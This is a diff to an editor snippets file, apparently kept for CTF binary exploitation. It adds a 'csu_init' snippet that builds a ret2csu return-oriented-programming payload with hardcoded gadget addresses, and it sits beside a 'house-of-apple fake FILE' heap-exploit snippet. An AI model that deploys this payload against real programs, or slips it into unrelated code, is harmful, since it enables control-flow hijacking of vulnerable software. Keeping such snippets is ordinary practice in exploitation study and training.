@@ -12,6 +12,23 @@
 	// 	],
 	// 	"description": "Log output to console"
 	// }
+	"call by csu_init": {
+		"prefix": "csu_init",
+		"body": [
+			"def call_by_csu_init(fn_got, arg0, arg1, arg2):",
+			"\t# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;",
+			"\taddr_pop6 = 0x40070A",
+			"\t# mov rdx, r13; mov rsi, r14; mov edi, r15d; call [r12+rbx*8]; add rbx, 1; cmp rbx, rbp; jnz ...; ",
+			"\t# add rsp, 8; pop * 6; ret",
+			"\taddr_call_arg3 = 0x4006F0",
+			"\tpayload = flat([",
+			"\t	addr_pop6, 0, 1, fn_got, arg2, arg1, arg0, ",
+			"\t	addr_call_arg3, [0]*7   # paddings",
+			"\t])",
+			"\treturn payload",
+		]
+	},
+	
 	"house-of-apple fake FILE": {
 		"prefix": "hoa",
 		"body": [
